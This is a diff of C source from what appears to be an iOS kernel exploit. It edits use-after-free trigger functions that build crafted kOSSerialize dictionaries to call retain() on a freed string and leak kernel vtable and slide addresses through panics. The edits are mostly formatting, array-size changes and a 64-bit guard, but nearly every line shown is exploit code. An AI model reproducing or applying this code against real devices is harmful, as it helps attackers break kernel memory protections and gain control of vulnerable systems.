@@ -28,14 +28,15 @@ static void print_info(void)
     {
         DEBUG("* Model: %-23s *", b);
     }
-    s = sizeof(b);
 
+    s = sizeof(b);
     cmd[0] = CTL_KERN;
     cmd[1] = KERN_OSVERSION;
     if(sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0) == 0)
     {
         DEBUG("* OS build: %-20s *", b);
     }
+
     DEBUG("* Anchor: " ADDR
 #ifdef __LP64__
         "    "
@@ -74,7 +75,7 @@ void uaf_with_vtab(addr_t addr)
 
     if(get_os_version() >= V_13C75) // 9.2
     {
-        uint32_t dict_92[8 + sizeof(OSString) / sizeof(uint32_t)] =
+        uint32_t dict_92[] =
         {
             kOSSerializeMagic,                                              // Magic
             kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
@@ -108,7 +109,7 @@ void uaf_with_vtab(addr_t addr)
     }
     else
     {
-        uint32_t dict_90[13 + sizeof(OSString) / sizeof(uint32_t)] =
+        uint32_t dict_90[] =
         {
             kOSSerializeMagic,                                              // Magic
             kOSSerializeEndCollection | kOSSerializeDictionary | 4,         // Dictionary with 4 entries
@@ -157,8 +158,12 @@ void uaf_with_vtab(addr_t addr)
 
 void uaf_panic_leak_DATA_const_base(void)
 {
+#ifdef __LP64__
+    THROW("Not supported on 64-bit - leak vtable instead");
+#else
     // Unsafe version of get_kernel_slide
     uaf_with_vtab((get_kernel_anchor() & 0xfff00000) + 0x1244);
+#endif
 }
 
 void uaf_panic_leak_vtab(void)
@@ -175,7 +180,7 @@ void uaf_panic_leak_vtab(void)
     const char str[4] = "str";
     uint32_t
     // The trigger
-    dict_92[5] =
+    dict_92[] =
     {
         kOSSerializeMagic,                                              // Magic
         kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries
@@ -184,7 +189,7 @@ void uaf_panic_leak_vtab(void)
         *((uint32_t*)str),
         kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
     },
-    dict_90[9] =
+    dict_90[] =
     {
         kOSSerializeMagic,                                              // Magic
         kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries
@@ -200,7 +205,7 @@ void uaf_panic_leak_vtab(void)
         kOSSerializeEndCollection | kOSSerializeObject | 2,             // Call ->retain() on the freed string
     },
     // the slot for the trigger
-    dict_hole[6] =
+    dict_hole[] =
     {
         kOSSerializeMagic,
         kOSSerializeEndCollection | kOSSerializeDictionary | 2,
